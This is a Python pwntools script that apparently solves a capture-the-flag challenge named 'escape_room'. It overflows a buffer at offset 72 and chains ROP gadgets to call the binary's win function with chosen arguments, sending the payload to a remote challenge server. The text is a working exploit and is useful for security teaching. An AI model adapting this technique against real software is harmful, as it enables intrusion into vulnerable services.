#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./escape_room', checksec=False)

#python3 -c "from pwn import *; print(cyclic(200))
#64B (buf) + 8B (saved RBP)
OFFSET_TO_RIP = 72

#gadgets inside the binary:
#loads first function argument
pop_rdi = 0x0000000000401287
#loads second function argument
pop_rsi = 0x0000000000401289
#ret gadget for stack alignment
ret_gadget = 0x40101a

p = remote("offsec.m0lecon.it", 13530)

p.recvuntil(b"keys?\n")

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    pop_rdi, 
    0xdeadbeef, 
    pop_rsi, 
    0xcafebabe, 
    p64(elf.sym.win),
    )

p.send(payload)

p.interactive()
